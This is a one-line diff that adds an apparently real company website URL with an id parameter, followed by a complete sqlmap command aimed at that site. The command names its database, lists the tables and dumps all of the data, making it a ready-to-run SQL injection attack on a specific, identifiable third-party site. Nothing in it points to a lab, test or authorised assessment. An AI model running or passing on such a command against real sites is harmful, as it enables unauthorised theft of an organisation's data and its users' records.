@@ -1,0 +1,1 @@
+http://www.agmgeotecnica.com.br/noticia.php?id=14 (GET)  # sqlmap.py -u http://www.agmgeotecnica.com.br/noticia.php?id=14 -D agmgeotecnica3 --tables --dump-all --threads 5 -v3
